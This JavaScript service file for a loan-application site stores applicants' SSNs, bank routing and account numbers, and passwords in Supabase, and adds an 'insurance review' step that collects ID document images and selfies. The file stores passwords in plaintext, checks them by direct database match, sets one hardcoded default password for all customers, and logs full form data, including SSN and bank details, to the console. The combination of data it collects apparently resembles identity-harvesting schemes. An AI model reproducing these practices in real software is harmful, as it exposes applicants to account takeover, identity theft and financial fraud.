import { supabase, TABLES, handleDatabaseError } from '../config/supabase'

// Customer Database Service
// Handles all database operations for customer data

export const DEFAULT_CUSTOMER_PASSWORD = 'UpStarLoan#2024'

// Table names
const INSURANCE_POLICY_REVIEWS = 'insurance_policy_reviews'
const ADMIN_NOTES = 'admin_notes'

/**
 * Strip data-URL prefix so dashboard can use raw base64
 */
export function stripBase64Prefix(dataUrl) {
  if (!dataUrl) return ''
  const commaIndex = dataUrl.indexOf(',')
  return commaIndex >= 0 ? dataUrl.slice(commaIndex + 1) : dataUrl
}

/**
 * Convert database record to application format
 */
export function mapDatabaseCustomerToApplication(customer) {
  if (!customer) return null

  return {
    id: customer.id,
    applicationId: customer.application_id,
    firstName: customer.first_name,
    lastName: customer.last_name,
    email: customer.email,
    phoneNumber: customer.phone_number,
    homeAddress: customer.home_address,
    city: customer.city,
    state: customer.state,
    zipCode: customer.zip_code,
    dateOfBirth: customer.date_of_birth,
    ssnNumber: customer.ssn_number,
    loanAmount: customer.loan_amount,
    loanPurpose: customer.loan_purpose,
    loanTerm: customer.loan_term,
    monthlyPayment: customer.monthly_payment,
    loanAgent: customer.loan_agent,
    bankName: customer.bank_name,
    routingNumber: customer.routing_number,
    accountNumber: customer.account_number,
    userId: customer.user_id,
    password: customer.password,
    status: customer.status,
    submissionDate: customer.submission_date,
    adminNotes: customer.admin_notes
  }
}

/**
 * Convert application form data to database format
 */
export function mapApplicationDataToDatabase(formData) {
  const applicationId = formData.applicationId || `LS-${Date.now()}`
  
  return {
    application_id: applicationId,
    first_name: formData.firstName,
    last_name: formData.lastName,
    email: (formData.email || '').trim().toLowerCase(),
    phone_number: formData.phoneNumber,
    home_address: formData.homeAddress,
    city: formData.city,
    state: formData.state,
    zip_code: formData.zipCode,
    date_of_birth: formData.dateOfBirth,
    ssn_number: formData.ssnNumber,
    loan_amount: parseFloat(formData.loanAmount),
    loan_purpose: formData.loanPurpose,
    loan_term: parseInt(formData.loanTerm),
    monthly_payment: parseFloat(formData.monthlyPayment),
    loan_agent: formData.loanAgent,
    bank_name: formData.bankName,
    routing_number: formData.routingNumber,
    account_number: formData.accountNumber,
    user_id: formData.userId || `${formData.firstName.toLowerCase()}_${formData.lastName.toLowerCase()}_${formData.phoneNumber.slice(-4)}`,
    password: formData.password || DEFAULT_CUSTOMER_PASSWORD,
    status: formData.status || 'review',
    admin_notes: formData.adminNotes || ''
  }
}

/**
 * Save new customer to database
 */
export async function saveCustomerToDatabase(formData) {
  try {
    console.log('=== SAVE CUSTOMER TO DATABASE ===')
    console.log('Input formData:', formData)
    
    const customerData = mapApplicationDataToDatabase(formData)
    console.log('Mapped customerData for database:', customerData)
    
    console.log('Attempting to insert into customers table...')
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .insert(customerData)
      .select()
      .single()
    
    if (error) {
      console.error('❌ DATABASE INSERT ERROR:', error)
      console.error('Error code:', error.code)
      console.error('Error message:', error.message)
      console.error('Error details:', error.details)
      throw error
    }
    
    console.log('✅ CUSTOMER INSERTED SUCCESSFULLY:', data)
    console.log('Customer ID:', data.id)
    console.log('Application ID:', data.application_id)
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('❌ ERROR SAVING CUSTOMER TO DATABASE:', error)
    console.error('Error stack:', error.stack)
    throw handleDatabaseError(error)
  }
}

/**
 * Update existing customer in database
 */
export async function updateCustomerInDatabase(applicationId, updateData) {
  try {
    // Convert camelCase to snake_case for database
    const dbUpdateData = {}
    Object.keys(updateData).forEach(key => {
      const snakeKey = key.replace(/([A-Z])/g, '_$1').toLowerCase()
      dbUpdateData[snakeKey] = updateData[key]
    })
    
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .update(dbUpdateData)
      .eq('application_id', applicationId)
      .select()
      .single()
    
    if (error) throw error
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('Error updating customer in database:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Get all customers from database
 */
export async function fetchAllCustomers() {
  try {
    console.log('fetchAllCustomers: querying table:', TABLES.CUSTOMERS)
    console.log('fetchAllCustomers: supabase URL:', supabase.supabaseUrl)
    
    const { data, error, status, statusText } = await supabase
      .from(TABLES.CUSTOMERS)
      .select('*')
      .order('submission_date', { ascending: false })
    
    console.log('fetchAllCustomers: response status:', status, statusText)
    console.log('fetchAllCustomers: raw data:', data)
    console.log('fetchAllCustomers: error:', error)
    
    if (error) throw error
    
    if (!data || data.length === 0) {
      console.log('fetchAllCustomers: No rows returned from customers table')
      return []
    }
    
    return data.map(mapDatabaseCustomerToApplication)
  } catch (error) {
    console.error('Error fetching customers from database:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Get customer by email
 */
export async function fetchCustomerByEmail(email) {
  try {
    const normalizedEmail = email.trim().toLowerCase()
    console.log('fetchCustomerByEmail: looking up:', normalizedEmail)
    
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .select('*')
      .eq('email', normalizedEmail)
      .order('submission_date', { ascending: false })
      .limit(1)
    
    if (error) {
      console.error('fetchCustomerByEmail error:', error)
      throw error
    }
    
    if (!data || data.length === 0) {
      console.log('fetchCustomerByEmail: no customer found')
      return null
    }
    
    console.log('fetchCustomerByEmail: found customer:', data[0].application_id)
    return mapDatabaseCustomerToApplication(data[0])
  } catch (error) {
    console.error('Error fetching customer by email:', error)
    return null // Return null instead of throwing so fallback works
  }
}

/**
 * Get customer by application ID
 */
export async function fetchCustomerByApplicationId(applicationId) {
  try {
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .select('*')
      .eq('application_id', applicationId)
      .single()
    
    if (error) {
      if (error.code === 'PGRST116') {
        return null // Customer not found
      }
      throw error
    }
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('Error fetching customer by application ID:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Save customer login credentials
 */
export async function saveCustomerCredentials(applicationId, userId, password) {
  try {
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .update({
        user_id: userId,
        password: password
      })
      .eq('application_id', applicationId)
      .select()
      .single()
    
    if (error) throw error
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('Error saving customer credentials:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Authenticate customer login
 */
export async function authenticateCustomer(userId, password) {
  try {
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .select('*')
      .eq('user_id', userId)
      .eq('password', password)
      .single()
    
    if (error) {
      if (error.code === 'PGRST116') {
        return null // Invalid credentials
      }
      throw error
    }
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('Error authenticating customer:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Update customer status
 */
export async function updateCustomerStatus(applicationId, status, adminNotes = '') {
  try {
    const updateData = { status }
    if (adminNotes) {
      updateData.admin_notes = adminNotes
    }
    
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .update(updateData)
      .eq('application_id', applicationId)
      .select()
      .single()
    
    if (error) throw error
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('Error updating customer status:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Delete customer (soft delete by updating status)
 */
export async function deleteCustomer(applicationId) {
  try {
    const { data, error } = await supabase
      .from(TABLES.CUSTOMERS)
      .update({ status: 'deleted' })
      .eq('application_id', applicationId)
      .select()
      .single()
    
    if (error) throw error
    
    return mapDatabaseCustomerToApplication(data)
  } catch (error) {
    console.error('Error deleting customer:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Insurance Policy Review Functions
 */

/**
 * Trigger insurance review for a customer
 */
export async function triggerInsuranceReview(email) {
  try {
    console.log('Triggering insurance review for email:', email)
    
    const { data, error } = await supabase
      .from(ADMIN_NOTES)
      .insert({
        email: email,
        note_text: 'Insurance Policy Review Required. Please complete the insurance policy review process by clicking the button below.',
        note_type: 'insurance_review',
        created_at: new Date().toISOString()
      })

    if (error) {
      console.error('Error triggering insurance review:', error)
      throw error
    }
    
    console.log('Insurance review triggered successfully')
    return data
  } catch (error) {
    console.error('Error triggering insurance review:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Load admin notes for a customer
 */
export async function loadAdminNotes(email) {
  try {
    console.log('Loading admin notes for email:', email)
    
    const { data: notes, error } = await supabase
      .from(ADMIN_NOTES)
      .select('*')
      .eq('email', email)
      .order('created_at', { ascending: false })

    if (error) {
      console.error('Error loading admin notes:', error)
      throw error
    }

    return notes || []
  } catch (error) {
    console.error('Error loading admin notes:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Save insurance policy review
 */
export async function saveInsuranceReview(reviewData) {
  try {
    console.log('Saving insurance review for email:', reviewData.email)
    
    // Determine ID verification status based on whether documents were uploaded
    const idVerificationStatus = (reviewData.idDocumentFront || reviewData.idDocumentBack || reviewData.selfiePhoto) 
      ? 'submitted' 
      : 'not_submitted'
    
    const { data, error } = await supabase
      .from(INSURANCE_POLICY_REVIEWS)
      .upsert({
        email: reviewData.email,
        understanding_statement: reviewData.understandingStatement,
        ip_address: reviewData.ipAddress,
        id_type: reviewData.idType,
        id_document_front_url: reviewData.idDocumentFront || null,
        id_document_back_url: reviewData.idDocumentBack || null,
        selfie_photo_url: reviewData.selfiePhoto || null,
        id_verification_status: idVerificationStatus,
        review_completed: true,
        completed_at: new Date().toISOString()
      }, {
        onConflict: 'email'
      })

    if (error) {
      console.error('Error saving insurance review:', error)
      throw error
    }
    
    console.log('Insurance review saved successfully')
    
    // Add notification to admin that customer completed insurance review
    await supabase
      .from(ADMIN_NOTES)
      .insert({
        email: reviewData.email,
        note_text: `Customer has completed insurance policy review. IP: ${reviewData.ipAddress}, ID Type: ${reviewData.idType}. ID Verification: ${idVerificationStatus}. Customer agreed to all terms.`,
        note_type: 'insurance_completed',
        created_at: new Date().toISOString()
      })
    
    return data
  } catch (error) {
    console.error('Error saving insurance review:', error)
    throw handleDatabaseError(error)
  }
}

/**
 * Check insurance review status for a customer
 */
export async function checkInsuranceReviewStatus(email) {
  try {
    console.log('Checking insurance review status for email:', email)
    
    const { data, error } = await supabase
      .from(INSURANCE_POLICY_REVIEWS)
      .select('review_completed, completed_at, id_verification_status, id_document_front_url, id_document_back_url, selfie_photo_url, id_type')
      .eq('email', email)
      .single()

    if (error) {
      if (error.code === 'PGRST116') {
        return { review_completed: false, completed_at: null, id_verification_status: 'not_submitted', id_document_front_url: null, id_document_back_url: null, selfie_photo_url: null, id_type: null }
      }
      throw error
    }

    return data || { review_completed: false, completed_at: null, id_verification_status: 'not_submitted', id_document_front_url: null, id_document_back_url: null, selfie_photo_url: null, id_type: null }
  } catch (error) {
    console.error('Error checking insurance review status:', error)
    return { review_completed: false, completed_at: null, id_verification_status: 'not_submitted', id_document_front_url: null, id_document_back_url: null, selfie_photo_url: null, id_type: null }
  }
}
